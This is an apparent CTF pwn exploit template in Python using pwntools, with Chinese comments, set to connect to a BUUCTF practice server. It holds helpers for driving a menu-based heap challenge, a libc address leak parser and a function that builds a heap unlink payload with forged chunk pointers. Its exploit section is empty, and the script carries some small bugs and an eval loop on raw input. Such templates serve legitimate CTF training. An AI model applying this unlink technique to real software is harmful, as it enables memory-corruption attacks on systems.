from pwn import *
from LibcSearcher import *


# lib---------------------------------------------------------------------------------------------------
def my_error(error_info):
    """
    输出错误信息
    :param error_info: 文字
    :return: 无
    """
    print(f'\033[91m[Fatal Error]{error_info}\033[0m')
    sys.exit(1)


def my_info(info_text):
    """
    输出信息
    :param info_text: 文字
    :return:无
    """
    print(f'\033[92m[info]{info_text}\033[0m')


def push(info='push'):
    input(f'\033[91m----------[{info}]----------\033[0m')


def nd(binary_path, cmds_list=None):
    """
    new_debug
    直接创建新的gdb对象
    :param binary_path: 二进制文件路径
    :param cmds_list: gdb命令列表 ['a', 'b', 'c']
    :return: gdb对象
    """

    if not os.path.isfile(binary_path):
        raise my_error(f'({binary_path})文件不存在')

    # 如果传入了cmd_list，将其转换为gdb_script
    try:
        if cmds_list:
            script = '\n'.join(cmds_list)
            return gdb.debug(binary_path, gdbscript=script)
        else:
            return gdb.debug(binary_path)
    except Exception as e:
        raise my_error(f"启动 gdb 失败: {e}")


def get_binary_little_endian(num):
    """
    以小端序二进制方式返回整型数的二进制值字符串。

    参数:
    num (int) - 要转换为二进制值的整型数

    返回:
    str - 整型数的小端序二进制值字符串
    """
    binary_str = bin(num)[2:]  # 去掉二进制字符串前面的'0b'
    binary_str = binary_str.zfill(8 * (num.bit_length() // 8 + 1))  # 确保二进制字符串长度为8的倍数

    little_endian_binary = ''
    # 以小端序构建二进制值字符串
    for i in range(0, len(binary_str), 8):
        little_endian_binary += binary_str[i:i + 8][::-1] + ' '

    return little_endian_binary.strip()  # 去掉最后的空格


# set----------------------------------------------------------------------------------------------------
context.arch = 'amd64'
context.log_level = 'debug'
pwn_patch = './pwn'
libc_patch = './libc'
# pwn = ELF(pwn_patch)
# libc = ELF(libc_patch)
# rop = ROP(pwn)
# cmd_list = ['b *(0x400cbb)']
# cmd_list = ['b *$rebase(0xf40)']
# cmd_list = ['set follow-fork-mode parent', 'b *(0x400cbb)']
# cmd_list = ['set follow-fork-mode parent', 'b *$rebase(0xf40)']
# io = nd(pwn_patch, cmd_list)
io = remote('node5.buuoj.cn', 26032)
# libc------------------------------------------------------------------------------------------------


def get_add(arch=64):
    """
    从输出中快速获取libc地址
    :param arch: 架构32/64
    :return: 用于计算的libc地址
    """
    if arch == 64:
        adder = packing.u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\0'))
        my_info(hex(adder))
        return adder
    if arch == 32:
        adder = packing.u32(io.recv(4))
        my_info(hex(adder))
        return adder
    else:
        my_error('寻找泄露地址时使用了未知的架构')


# heap------------------------------------------------------------------------------------------------
trigger_condition = {
    'add': 1,
    'edit': 2,
    'show': 3,
    'free': 4,
}
flag = {
    'send_choose_when': b'choice:',
    'send_idx_when': b'idx?',
    'send_size_when': b'size?',
    'send_cont_when': b'content:'
}
index = -1
index_list = [None]*30


def menu(method):
    io.recvuntil(flag['send_choose_when'])
    io.sendline(str(trigger_condition[method]))


# noinspection PyTypeChecker
def add(size, cont=b'a'):
    global index
    global index_list
    menu('add')
    io.recvuntil(flag['send_size_when'])
    io.sendline(str(size))
    io.recvuntil(flag['send_cont_when'])
    io.sendline(cont)
    index += 1
    for i in range(30):
        if index_list[i] is None:
            index_list[i] = index
            break
    my_info(f'ADD:index[{index}]size[{hex(size)}]->{get_binary_little_endian(size)}')
    my_info(f'list:{index_list}')


def edit(idx, cont, size=0):
    menu('edit')
    io.recvuntil(flag['send_idx_when'])
    io.sendline(str(idx))
    if size != 0:
        io.recvuntil(flag['send_cont_when_when'])
        io.sendline(str(size))
    io.recvuntil(flag['send_cont_when'])
    io.sendline(cont)


def show(idx):
    menu('show')
    io.recvuntil(flag['send_idx_when'])
    io.sendline(str(idx))


def free(idx):
    global index
    global index_list
    menu('free')
    io.recvuntil(flag['send_idx_when'])
    io.sendline(str(idx))
    for i in range(30):
        if index_list[i] == index:
            index_list[i] = None
            break
    my_info(f'FREE:index[{index}]')
    my_info(f'list:{index_list}')


def unlink(size, add, next_size=None):
    """
    unlink_poc
    :param size: 上位堆总大小
    :param add: 目标add
    :param next_size: 下位堆总大小
    :return:poc
    """
    poc = p64(0)
    poc += p64(size - 0x10 + 1)
    poc += p64(add - 0x18)
    poc += p64(add - 0x10)
    poc += b'\x00' * (size - 0x30)
    poc += p64(size - 0x10)
    if next_size is None:
        poc += p64(size)
    else:
        poc += p64(next_size)
    return poc


# poc-----------------------------------------------------------------------------------------------------

# end-----------------------------------------------------------------------------------------------------
io.interactive()
while True:
    cmd = ''
    try:
        cmd = input('eval>>>')
        if cmd == 'exit':
            print(f'record:\n{cmd}')
        eval(cmd)
        cmd += cmd + '\n'
    except Exception as error_text:
        print(f'\033[91m[ERROR]:{error_text}\033[0m')
